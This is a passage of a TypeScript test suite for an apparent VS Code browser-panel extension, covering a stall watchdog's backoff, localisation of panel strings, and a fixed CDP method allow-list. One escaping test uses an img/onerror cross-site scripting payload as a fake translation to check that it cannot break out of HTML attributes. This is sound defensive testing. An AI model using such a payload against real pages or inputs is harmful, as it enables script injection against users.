    const b = await addTab(service, 'http://b');
    panelOf(a.entry).setVisible(true);
    panelOf(b.entry).setVisible(true);

    panelOf(a.entry).setVisible(false);
    await Promise.resolve();
    expect(priv(service).watchdogTimer).not.toBeNull(); // b is still visible

    panelOf(b.entry).setVisible(false);
    await Promise.resolve();
    expect(priv(service).watchdogTimer).toBeNull();
    service.dispose();
  });

  it('polls a stalled tab while visible and stops polling entirely once hidden', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    // A permanently stalled entry: every live tick that sees it restarts its stream.
    entry.health.shouldRestart = () => true;
    panel.setVisible(true);
    fireReady(entry);
    await Promise.resolve();
    start.mockClear();

    // Visibility ALONE must have started the interval — pre-slice nothing but launchAndAdopt did, so
    // these ticks produced no restarts at all and the silence after hiding proved nothing.
    vi.advanceTimersByTime(15_000);
    expect(start.mock.calls.length).toBeGreaterThanOrEqual(2);

    panel.setVisible(false);
    await Promise.resolve();
    start.mockClear();
    vi.advanceTimersByTime(60_000);

    expect(start).not.toHaveBeenCalled();
    service.dispose();
  });

  it('HIDING A TAB DOES NOT RESET ANY ENTRY\'S BACKOFF STREAK', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const a = await addTab(service, 'http://a');
    const b = await addTab(service, 'http://b');
    panelOf(a.entry).setVisible(true);
    panelOf(b.entry).setVisible(true);
    // Both tabs have been failing for a while and are deep into the backoff series.
    a.entry.watchdogFailureStreak = 4;
    a.entry.watchdogSkipTicks = 7;
    b.entry.watchdogFailureStreak = 2;
    b.entry.watchdogSkipTicks = 3;

    // The interval is genuinely running, so its stop below is a real stop and not a no-op.
    expect(priv(service).watchdogTimer).not.toBeNull();

    // The human tab-switches away from both — this is a UI action, not evidence of recovery.
    panelOf(a.entry).setVisible(false);
    await Promise.resolve();
    panelOf(b.entry).setVisible(false);
    await Promise.resolve();
    expect(priv(service).watchdogTimer).toBeNull();

    // Pre-slice, stopping the interval reset every entry's streak, so a user who tab-switched would
    // defeat the backoff entirely and hammer a wedged Chromium at 5s forever.
    expect(a.entry.watchdogFailureStreak).toBe(4);
    expect(a.entry.watchdogSkipTicks).toBe(7);
    expect(b.entry.watchdogFailureStreak).toBe(2);
    expect(b.entry.watchdogSkipTicks).toBe(3);
    service.dispose();
  });

  it('carries the streak across a hide→show→ready cycle, so the NEXT retry keeps the long gap', async () => {
    vi.useFakeTimers({ now: 0 });
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    entry.health.shouldRestart = () => true;
    panel.setVisible(true);
    // Build a real streak through the real watchdog: restarts at 5s, 10s, 20s.
    vi.advanceTimersByTime(20_000);
    expect(start.mock.calls.length).toBe(3);
    expect(entry.watchdogFailureStreak).toBe(3);

    // The 3rd restart set watchdogSkipTicks to 20_000 / 5_000 - 1 = 3, so three ticks must be sat out.
    expect(entry.watchdogSkipTicks).toBe(3);

    panel.setVisible(false);
    await Promise.resolve();
    panel.setVisible(true);
    fireReady(entry);
    await Promise.resolve();
    start.mockClear();

    // Pre-slice, the hide reset the streak and the next retry came ONE tick (5s) later. With the
    // streak intact the three owed skip-ticks are still owed: silence at 5s, 10s and 15s...
    for (const _ of [5_000, 10_000, 15_000]) {
      vi.advanceTimersByTime(5_000);
      expect(start).not.toHaveBeenCalled();
    }
    // ...and the 4th tick after the re-show is the one that acts.
    vi.advanceTimersByTime(5_000);
    expect(start).toHaveBeenCalledTimes(1);
    expect(entry.watchdogFailureStreak).toBe(4);
    service.dispose();
  });

  it('only a real FRAME clears a streak — a hide does not, a frame does', async () => {
    vi.useFakeTimers({ now: 0 });
    const service = await makeService();
    const { entry, start } = await addTab(service);
    const panel = panelOf(entry);
    entry.health.shouldRestart = () => true;
    panel.setVisible(true);
    fireReady(entry);
    // Build the streak through the REAL watchdog rather than assigning the fields, so the test
    // depends on the interval actually running while visible.
    vi.advanceTimersByTime(20_000);
    expect(entry.watchdogFailureStreak).toBe(3);

    // Same starting state, two different events, opposite outcomes — that contrast is the criterion.
    panel.setVisible(false);
    await Promise.resolve();
    expect(entry.watchdogFailureStreak).toBe(3);

    panel.setVisible(true);
    fireReady(entry);
    start.mockClear();
    priv(service).onScreencastFrame(entry, cdpFrame(1));

    expect(entry.watchdogFailureStreak).toBe(0);
    expect(entry.watchdogSkipTicks).toBe(0);
    // Behavioural confirmation: the next stall retries after ONE tick again, not the 40s the streak
    // had reached.
    vi.advanceTimersByTime(5_000);
    expect(start).toHaveBeenCalledTimes(1);
    service.dispose();
  });

  it('stops the interval when the last tab closes and when the service is disposed', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const a = await addTab(service, 'http://a');
    const b = await addTab(service, 'http://b');
    panelOf(a.entry).setVisible(true);
    panelOf(b.entry).setVisible(true);

    priv(service).handlePageClosed(a.page);
    expect(priv(service).watchdogTimer).not.toBeNull(); // b still visible

    priv(service).handlePageClosed(b.page);
    expect(priv(service).watchdogTimer).toBeNull();

    service.dispose();
    expect(priv(service).watchdogTimer).toBeNull();
  });

  it('does not run while disconnected, even with a visible panel', async () => {
    vi.useFakeTimers();
    const service = await makeService();
    const { entry } = await addTab(service);
    panelOf(entry).setVisible(true);
    expect(priv(service).watchdogTimer).not.toBeNull();

    // cleanup() must sync the watchdog AFTER pages is cleared and the state is 'disconnected';
    // running it at the top would see a populated map of visible panels and keep the interval alive.
    service.dispose();

    expect(priv(service).watchdogTimer).toBeNull();
    expect(service.isConnected()).toBe(false);
  });
});

// ── Acceptance: "`buildHtml` output contains no letter-bearing text node or title/placeholder
//    attribute outside the injected string set." (Q1) ─────────────────────────────────────────────

describe('Q1 — every user-visible panel string comes from l10n', () => {
  const MARKER = 'ZZQXLOCALEMARKERZZ';

  /** The panel html with every l10n.t call replaced by a uniquely-identifiable marker. */
  function markedHtml(): { html: string; keys: string[] } {
    const keys: string[] = [];
    let n = 0;
    vi.spyOn(vscode.l10n, 't').mockImplementation((message: string) => {
      keys.push(message);
      return `${MARKER}${n++}`;
    });
    const panel = new BrowserPanel();
    panel.show('http://a');
    const html = __webviewPanels[__webviewPanels.length - 1]!.webview.html;
    panel.dispose();
    return { html, keys };
  }

  /** Visible text nodes, excluding <script> and <style> — both are letter-bearing by construction. */
  function visibleTextNodes(html: string): string[] {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    for (const el of [...doc.querySelectorAll('script, style')]) el.remove();
    const walker = doc.createTreeWalker(doc.documentElement, NodeFilter.SHOW_TEXT);
    const out: string[] = [];
    for (let node = walker.nextNode(); node; node = walker.nextNode()) {
      const text = (node.textContent ?? '').trim();
      if (text) out.push(text);
    }
    return out;
  }

  it('has no hardcoded letter-bearing visible text — every text node is a marker', () => {
    const { html } = markedHtml();

    for (const text of visibleTextNodes(html)) {
      // Anything with a letter that is not a marker is user-visible English baked into the source.
      if (/\p{L}/u.test(text)) expect(text).toContain(MARKER);
    }
  });

  it('has no hardcoded title or placeholder attribute — every one is a marker', () => {
    const { html } = markedHtml();
    const doc = new DOMParser().parseFromString(html, 'text/html');

    const attrs = [...doc.querySelectorAll('[title], [placeholder]')].flatMap((el) =>
      ['title', 'placeholder'].map((a) => el.getAttribute(a)).filter((v): v is string => v !== null),
    );
    expect(attrs.length).toBeGreaterThanOrEqual(7); // back/forward/reload/pick/devtools/newtab/url
    for (const value of attrs) {
      if (/\p{L}/u.test(value)) expect(value).toContain(MARKER);
    }
  });

  it('requests exactly the documented key set, and every key is in BOTH l10n bundles', () => {
    const { keys } = markedHtml();
    const expected = [
      'Back', 'Forward', 'Reload', 'Pick Element',
      'Open Developer Tools (F12)', 'New Tab', 'Enter URL...', 'Waiting for browser frames...',
    ];

    expect([...keys].sort()).toEqual([...expected].sort());

    const root = join(SRC_DIR, '..', '..', '..');
    const en = JSON.parse(readFileSync(join(root, 'l10n', 'bundle.l10n.json'), 'utf8')) as Record<string, string>;
    const el = JSON.parse(readFileSync(join(root, 'l10n', 'bundle.l10n.el.json'), 'utf8')) as Record<string, string>;
    // The Chrome-exit warning is localised in the same slice but requested from index.ts, not buildHtml.
    for (const key of [...expected, 'The browser closed unexpectedly. Open it again to continue.']) {
      expect(`en:${key}:${key in en}`).toBe(`en:${key}:true`);
      expect(`el:${key}:${key in el}`).toBe(`el:${key}:true`);
      expect(el[key]).not.toBe(''); // a blank Greek value is a missing translation, not a translation
    }
  });

  it('builds the strings PER PANEL, not at module load, so l10n.t is observable per construction', () => {
    // A module-scope `const strings = {...}` would be evaluated once, at import, before any locale is
    // active — and would make the marker test above pass for the wrong reason on the first panel only.
    const first = markedHtml();
    vi.restoreAllMocks();
    const second = markedHtml();

    expect(second.keys).toEqual(first.keys);
    expect(second.html).toContain(MARKER);
  });

  it('escapes the injected strings, so a translation containing markup cannot break out', () => {
    vi.spyOn(vscode.l10n, 't').mockImplementation(() => '"><img src=x onerror=alert(1)>\'&');
    const panel = new BrowserPanel();
    panel.show('http://a');
    const html = __webviewPanels[__webviewPanels.length - 1]!.webview.html;
    const doc = new DOMParser().parseFromString(html, 'text/html');

    // These land in title="…" / placeholder="…" attributes, so all five of &<>"' must be escaped.
    // The security property is that NO element or attribute breaks out — not that the substring
    // "onerror=..." is absent, which survives harmlessly as inert text once < > and " are escaped.
    expect(doc.querySelector('img')).toBeNull();
    expect(html).not.toContain('<img');
    // Round-trips exactly: the parser sees one attribute value, not markup plus a stray attribute.
    expect(doc.getElementById('btn-back')!.getAttribute('title')).toBe('"><img src=x onerror=alert(1)>\'&');
    expect(doc.getElementById('btn-back')!.hasAttribute('onerror')).toBe(false);
    expect(doc.getElementById('url-input')!.getAttribute('placeholder')).toBe('"><img src=x onerror=alert(1)>\'&');
    panel.dispose();
  });
});

// ── The inviolable invariant, re-asserted across everything this slice added ─────────────────────

describe('the inviolable invariant holds across the whole slice', () => {
  it('never sends Runtime.enable or Console.enable through a full hide/show/ready/history cycle', async () => {
    const service = await makeService();
    const { entry } = await addTab(service);
    const panel = panelOf(entry);

    panel.setVisible(true);
    fireReady(entry);
    priv(service).onScreencastFrame(entry, cdpFrame(1));
    panel.setVisible(false);
    await Promise.resolve();
    panel.setVisible(true);
    fireReady(entry);
    for (const type of ['goBack', 'goForward', 'reload', 'insertText']) {
      panel.fireMessage(type === 'insertText' ? { type, text: 'x' } : { type });
    }
    await Promise.resolve();
    await Promise.resolve();

    const methods = entry.session.send.mock.calls.map((c) => c[0]);
    expect(methods).not.toContain('Runtime.enable');
    expect(methods).not.toContain('Console.enable');
    service.dispose();
  });

  it('adds no CDP_ALLOWED_METHODS entry: the list is byte-identical to the pre-slice baseline', async () => {
    const { CDP_ALLOWED_METHODS } = await import('../page-controller');

    // Captured from the pre-slice tree (page-controller.ts:17-56) before any Slice 2 work landed.
    expect([...CDP_ALLOWED_METHODS]).toEqual([
      'Page.enable', 'DOM.enable', 'CSS.enable', 'Overlay.enable', 'Accessibility.enable',
      'Page.navigate', 'Page.captureScreenshot', 'Page.getLayoutMetrics',
      'Page.startScreencast', 'Page.stopScreencast', 'Page.screencastFrameAck',
      'Runtime.evaluate', 'Runtime.callFunctionOn', 'Runtime.addBinding',
      'DOM.getDocument', 'DOM.querySelector', 'DOM.getOuterHTML', 'DOM.getBoxModel',
      'DOM.describeNode', 'DOM.resolveNode', 'DOM.requestNode', 'DOM.focus', 'DOM.getNodeForLocation',
      'CSS.getComputedStyleForNode', 'CSS.getMatchedStylesForNode',
      'Overlay.setInspectMode', 'Accessibility.getFullAXTree', 'Accessibility.getPartialAXTree',
      'Input.dispatchMouseEvent', 'Input.dispatchKeyEvent', 'Input.insertText',
      'Emulation.setDeviceMetricsOverride', 'Emulation.setUserAgentOverride',
    ]);
  });
});
